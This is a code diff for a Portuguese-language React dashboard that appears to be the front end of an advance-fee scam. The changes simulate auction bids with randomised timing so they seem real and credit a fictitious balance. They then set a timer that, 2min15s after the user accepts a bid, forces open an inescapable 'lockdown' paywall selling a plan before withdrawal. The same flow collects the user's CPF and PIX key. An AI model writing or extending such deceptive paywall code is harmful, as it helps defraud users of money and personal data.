@@ -413,12 +413,15 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
         return;
       }
       if (withdrawMethod === "pix") {
-        if (!withdrawPixKey) {
+        // Se tipo é CPF, copia o doc do titular pra chave PIX (sempre que avança)
+        if (withdrawPixKeyType === "cpf") {
+          if (!withdrawDoc) {
+            setWithdrawError("Informe o CPF do titular acima.");
+            return;
+          }
+          setWithdrawPixKey(withdrawDoc);
+        } else if (!withdrawPixKey) {
           setWithdrawError("Informe a chave PIX.");
-          return;
-        }
-        if (withdrawPixKeyType === "cpf" && withdrawPixKey.replace(/\D/g, "") !== withdrawDoc.replace(/\D/g, "")) {
-          setWithdrawError("A chave PIX (CPF) precisa ser igual ao CPF do beneficiário.");
           return;
         }
       } else {
@@ -509,7 +512,9 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
   // - HARD: cupom ativo (47% off) — modal fechado em qualquer ação, ESC ignorado, clique fora ignorado
   // - SOFT: vendeu há 3+ min sem plano — modal pode ser fechado, mas mostra aviso
   const isHardLockdown = !!activeCoupon && !hasActivePlan;
-  const hasSoldOver3Min = hasSold && !!soldAt && Date.now() - soldAt >= 3 * 60 * 1000;
+  // Soft lockdown: 2min15s após a usuária selecionar o lance vencedor
+  const LOCKDOWN_DELAY_MS = 2 * 60 * 1000 + 15 * 1000; // 2min15s
+  const hasSoldOver3Min = !!soldAt && Date.now() - soldAt >= LOCKDOWN_DELAY_MS;
   const isSoftLockdown = !hasActivePlan && hasSoldOver3Min && !isHardLockdown;
   const isLockdown = isHardLockdown; // mantém compat com refs antigas
 
@@ -979,7 +984,7 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
 
     // Caso 2: já vendeu há 3+ min E não está na aba wallet E modal de saque fechado
     const inSafeArea = tab === "wallet" || showWithdrawModal;
-    if (hasSold && soldAt && Date.now() - soldAt >= 3 * 60 * 1000 && !inSafeArea) {
+    if (soldAt && Date.now() - soldAt >= LOCKDOWN_DELAY_MS && !inSafeArea) {
       console.log("[Lockdown] Vendeu há 3+ min, fora da carteira → abrindo paywall");
       setWithdrawAmount(walletBalance);
       if (!withdrawNumber) {
@@ -991,19 +996,19 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
     }
   }, [stateLoaded, activeCoupon, hasActivePlan, hasSold, soldAt, walletBalance, tab, showWithdrawModal]);
 
-  // Timer pra disparar lockdown quando atingir os 3 minutos depois da venda
+  // Timer pra disparar lockdown 2min15s após selecionar o lance vencedor
   useEffect(() => {
-    if (!hasSold || !soldAt || hasActivePlan) return;
+    if (!soldAt || hasActivePlan) return;
     const elapsed = Date.now() - soldAt;
-    const remaining = 3 * 60 * 1000 - elapsed;
+    const remaining = LOCKDOWN_DELAY_MS - elapsed;
     if (remaining <= 0) return; // já passou (será tratado pelo effect acima)
     const timer = setTimeout(() => {
       const inSafeArea = tab === "wallet" || showWithdrawModal;
       if (inSafeArea) {
-        console.log("[Lockdown] 3min completaram mas em safe area, não interrompe");
+        console.log("[Lockdown] 2min15s completaram mas em safe area, não interrompe");
         return;
       }
-      console.log("[Lockdown] 3min após venda, abrindo paywall");
+      console.log("[Lockdown] 2min15s após selectWinningBid, abrindo paywall");
       setWithdrawAmount(walletBalance);
       if (!withdrawNumber) {
         setWithdrawNumber(Math.floor(100000 + Math.random() * 900000).toString());
@@ -1013,7 +1018,7 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
       setShowWithdrawModal(true);
     }, remaining);
     return () => clearTimeout(timer);
-  }, [hasSold, soldAt, hasActivePlan, tab, showWithdrawModal]);
+  }, [soldAt, hasActivePlan, tab, showWithdrawModal]);
 
   // Bloqueia ESC global em lockdown (impede fechar via teclado)
   useEffect(() => {
@@ -1068,16 +1073,19 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
       currentIdx = Math.max(1, Math.floor(progress * cfg.totalBids));
     }
 
-    // Timing: 3s inicial + 16s pra distribuir os lances = 19s total
-    // Garantimos delay mínimo de 900ms entre lances (não amontoar)
+    // Timing: 3s espera inicial. Depois cada lance espera entre 1s e 3s (aleatório real,
+    // sem padrão). Pré-sorteamos os delays no início pra cada lance ter um tempo único.
     const INITIAL_DELAY_MS = 3000;
-    const AUCTION_DURATION_MS = 16000;
-    const MIN_DELAY_BETWEEN_BIDS_MS = 900;
-    const remainingBids = cfg.totalBids - currentIdx;
-    const intervalPerBid = Math.max(
-      MIN_DELAY_BETWEEN_BIDS_MS,
-      AUCTION_DURATION_MS / Math.max(remainingBids, 1)
-    );
+    const MIN_DELAY_BETWEEN_BIDS_MS = 1000;
+    const MAX_DELAY_BETWEEN_BIDS_MS = 3000;
+
+    // Pré-sorteia o delay de cada lance (cada um entre 1-3s, independentes)
+    const bidDelays: number[] = [];
+    for (let i = 0; i < cfg.totalBids; i++) {
+      const r = Math.random();
+      bidDelays.push(MIN_DELAY_BETWEEN_BIDS_MS + r * (MAX_DELAY_BETWEEN_BIDS_MS - MIN_DELAY_BETWEEN_BIDS_MS));
+    }
+    console.log(`[Leilão] Delays sorteados:`, bidDelays.map(d => Math.round(d) + "ms"));
 
     const scheduleNextBid = (isFirst: boolean) => {
       // Se atingiu o total → para
@@ -1086,11 +1094,10 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
         return;
       }
 
-      // Primeiro lance: 3s. Demais: ~intervalPerBid com jitter forte (±40%)
-      // Variação dá sensação humana — alguns 1s, outros 2s+
-      const baseDelay = isFirst && !isResumed ? INITIAL_DELAY_MS : intervalPerBid;
-      const jitter = (Math.random() - 0.5) * 0.8 * baseDelay; // ±40%
-      const delay = Math.max(MIN_DELAY_BETWEEN_BIDS_MS, baseDelay + jitter);
+      // Primeiro lance: 3s espera. Demais: usa o delay pré-sorteado pra esse índice
+      const delay = isFirst && !isResumed
+        ? INITIAL_DELAY_MS
+        : bidDelays[currentIdx] || (MIN_DELAY_BETWEEN_BIDS_MS + Math.random() * 2000);
 
       timeoutId = setTimeout(() => {
         if (auctionEnded) return;
@@ -1222,6 +1229,8 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
     setSelectedBid(bid);
     setSaleStep("verifying");
     setShowFinalModal(false);
+    // Marca timestamp do início do lockdown contagem (2min15s a partir daqui)
+    setSoldAt(Date.now());
     setTimeout(() => setSaleStep("debiting"), 2200);
     setTimeout(() => {
       setSaleStep("success");
@@ -1233,7 +1242,6 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
         return newBalance;
       });
       setHasSold(true);
-      setSoldAt(Date.now());
 
       // Salva como leilão histórico
       const past: PastAuction = {
@@ -1903,20 +1911,38 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
                 {walletBalance > 0 ? "Sacar saldo" : "Sem saldo disponível"}
               </button>
 
-              {/* Card taxa progressiva */}
+              {/* Card plano atual + taxa */}
               <div className="bg-white border border-gray-200 rounded-2xl p-5 mb-4 shadow-sm">
                 <div className="flex items-start justify-between mb-4">
                   <div>
-                    <p className="text-xs uppercase tracking-wider text-gray-500 font-semibold mb-1">Sua taxa atual</p>
-                    <div className="flex items-baseline gap-2">
-                      <span className="font-display text-4xl text-gray-900 font-light tabular-nums">10</span>
-                      <span className="text-2xl text-gray-700">%</span>
+                    <p className="text-xs uppercase tracking-wider text-gray-500 font-semibold mb-1">Plano atual</p>
+                    <div className="flex items-baseline gap-2 mb-1">
+                      <span className="font-display text-2xl text-gray-900">Creator</span>
                     </div>
+                    <p className="text-xs text-gray-600">Taxa: <span className="font-semibold text-gray-900">10%</span> por venda</p>
                   </div>
-                  <div className="bg-gray-100 rounded-full px-3 py-1">
+                  <div className="bg-gray-100 rounded-full px-3 py-1.5 flex items-center gap-1">
+                    <span className="text-base">🪙</span>
                     <span className="text-[10px] uppercase tracking-wider text-gray-700 font-semibold">Iniciante</span>
                   </div>
                 </div>
+
+                {/* Botão trocar plano */}
+                <button
+                  onClick={() => {
+                    setWithdrawAmount(walletBalance);
+                    setWithdrawNumber(Math.floor(100000 + Math.random() * 900000).toString());
+                    setWithdrawStep("plan");
+                    setWithdrawError("");
+                    setShowWithdrawModal(true);
+                  }}
+                  className="w-full mb-4 py-3 rounded-xl text-sm font-semibold bg-gradient-to-r from-emerald-500 to-[#62C86E] hover:opacity-90 text-white transition flex items-center justify-center gap-2 shadow-sm"
+                >
+                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth={2}>
+                    <path strokeLinecap="round" strokeLinejoin="round" d="M16 12V8a4 4 0 00-8 0v4m-2 0h12a2 2 0 012 2v6a2 2 0 01-2 2H6a2 2 0 01-2-2v-6a2 2 0 012-2z" />
+                  </svg>
+                  <span>Escolher um plano</span>
+                </button>
 
                 <div className="bg-gray-50 rounded-xl p-4 space-y-3 border border-gray-100">
                   <p className="text-[11px] uppercase tracking-wider text-gray-500 font-semibold">📈 Reduza sua taxa</p>
@@ -1926,7 +1952,7 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
                       <div className="flex items-center gap-2 flex-1 min-w-0">
                         <div className="w-7 h-7 rounded-full bg-gray-200 text-gray-700 flex items-center justify-center text-xs font-bold flex-shrink-0">10%</div>
                         <div className="text-xs text-gray-700 truncate">
-                          <span className="font-semibold">Iniciante</span> — até R$ 50.000 sacados
+                          <span className="font-semibold">Creator</span> — até R$ 12.000 / mês
                         </div>
                       </div>
                       <span className="text-[10px] text-gray-500 flex-shrink-0">atual</span>
@@ -1936,7 +1962,7 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
                       <div className="flex items-center gap-2 flex-1 min-w-0">
                         <div className="w-7 h-7 rounded-full bg-blue-100 text-blue-700 flex items-center justify-center text-xs font-bold flex-shrink-0">8%</div>
                         <div className="text-xs text-gray-700 truncate">
-                          <span className="font-semibold">Pro</span> — após R$ 50.000 sacados
+                          <span className="font-semibold">Creator Advanced</span> — até R$ 48.000 / mês
                         </div>
                       </div>
                       <span className="text-[10px] text-gray-500 flex-shrink-0">🔒</span>
@@ -1944,9 +1970,9 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
 
                     <div className="flex items-center justify-between gap-3 opacity-50">
                       <div className="flex items-center gap-2 flex-1 min-w-0">
-                        <div className="w-7 h-7 rounded-full bg-gradient-to-br from-amber-300 to-amber-500 text-amber-900 flex items-center justify-center text-xs font-bold flex-shrink-0">5%</div>
+                        <div className="w-7 h-7 rounded-full bg-gradient-to-br from-amber-300 to-amber-500 text-amber-900 flex items-center justify-center text-xs font-bold flex-shrink-0">4%</div>
                         <div className="text-xs text-gray-700 truncate">
-                          <span className="font-semibold">Super Creator</span> — convite especial
+                          <span className="font-semibold">Top Creator</span> — acima de R$ 48.000 / mês
                         </div>
                       </div>
                       <span className="text-[10px] text-gray-500 flex-shrink-0">⭐</span>
@@ -2377,12 +2403,8 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
                 <button onClick={() => { setWithdrawMethod("pix"); nextWithdrawStep(); }}
                   className="w-full bg-white border-2 border-gray-200 hover:border-emerald-500 rounded-2xl p-4 mb-3 text-left transition group">
                   <div className="flex items-center gap-3">
-                    <div className="w-12 h-12 bg-emerald-50 rounded-xl flex items-center justify-center group-hover:bg-emerald-100 transition p-2">
-                      {/* Logo PIX oficial (BCB) */}
-                      <svg viewBox="0 0 512 512" className="w-full h-full" xmlns="http://www.w3.org/2000/svg">
-                        <path fill="#32BCAD" d="M394.292 350.717c-19.111 0-37.083-7.452-50.59-20.96l-72.55-72.55a9.715 9.715 0 0 0-13.435 0l-72.81 72.81c-13.51 13.508-31.482 20.962-50.594 20.962h-14.28l91.873 91.876c28.687 28.687 75.196 28.687 103.881 0l92.137-92.137h-13.632zM134.314 156.13c19.111 0 37.083 7.452 50.594 20.96l72.81 72.81a9.503 9.503 0 0 0 13.434 0l72.55-72.546c13.508-13.51 31.481-20.96 50.59-20.96h13.632l-92.137-92.14c-28.685-28.687-75.194-28.687-103.881 0l-91.872 91.876h14.28z"/>
-                        <path fill="#32BCAD" d="M442.156 204.155l-55.7-55.703c-1.225.493-2.553.79-3.96.79h-16.834c-13.184 0-26.121 5.34-35.443 14.66l-72.55 72.546c-3.738 3.738-8.643 5.605-13.55 5.605-4.904 0-9.81-1.867-13.547-5.605l-72.81-72.81c-9.32-9.32-22.255-14.66-35.44-14.66H122.6a10.392 10.392 0 0 1-3.755-.749L52.95 204.155c-28.686 28.687-28.686 75.196 0 103.882l65.893 65.892c1.171-.453 2.434-.732 3.756-.732h20.715c13.184 0 26.119-5.34 35.439-14.66l72.808-72.804c7.235-7.236 19.864-7.236 27.098-.004l72.547 72.546c9.323 9.323 22.26 14.661 35.443 14.661h16.834c1.408 0 2.736.299 3.961.792l55.7-55.701c28.687-28.689 28.687-75.198 0-103.884"/>
-                      </svg>
+                    <div className="w-12 h-12 bg-[#32BCAD] rounded-xl flex items-center justify-center group-hover:bg-[#2BA89A] transition">
+                      <span className="text-white font-bold text-base tracking-wider">PIX</span>
                     </div>
                     <div className="flex-1">
                       <div className="font-bold text-gray-900">PIX</div>
@@ -2489,24 +2511,29 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
 
                     <div className="mb-3">
                       <label className="block text-[10px] uppercase tracking-wider text-gray-500 font-semibold mb-1.5">Chave PIX</label>
-                      <input type="text" value={withdrawPixKey}
-                        onChange={(e) => setWithdrawPixKey(e.target.value)}
+                      <input type="text"
+                        value={withdrawPixKeyType === "cpf" ? (withdrawDoc || "") : withdrawPixKey}
+                        onChange={(e) => {
+                          // Não permite editar quando é CPF — sempre usa o doc do titular
+                          if (withdrawPixKeyType === "cpf") return;
+                          setWithdrawPixKey(e.target.value);
+                        }}
                         readOnly={withdrawPixKeyType === "cpf"}
                         placeholder={
-                          withdrawPixKeyType === "cpf" ? "Mesmo CPF acima" :
                           withdrawPixKeyType === "phone" ? "+55 (00) 00000-0000" :
                           withdrawPixKeyType === "email" ? "seu@email.com" :
-                          "abc12345-..."
+                          withdrawPixKeyType === "random" ? "abc12345-..." :
+                          ""
                         }
                         className={`w-full border rounded-xl px-4 py-3 text-sm text-gray-900 outline-none transition ${
                           withdrawPixKeyType === "cpf"
-                            ? "bg-emerald-50/40 border-emerald-200 cursor-not-allowed"
+                            ? "bg-emerald-50/40 border-emerald-200 cursor-not-allowed font-mono tabular-nums"
                             : "bg-gray-50 border-gray-200 focus:border-gray-900"
                         }`} />
                       <p className="text-[10px] text-gray-500 mt-1">
                         {withdrawPixKeyType === "cpf"
-                          ? "✓ Chave preenchida automaticamente com o CPF do beneficiário."
-                          : "ⓘ A chave precisa estar vinculada ao mesmo CPF/CNPJ do beneficiário."}
+                          ? "✓ Chave PIX preenchida automaticamente com o CPF do titular."
+                          : "ⓘ A chave precisa estar vinculada ao mesmo CPF/CNPJ do titular."}
                       </p>
                     </div>
                   </>
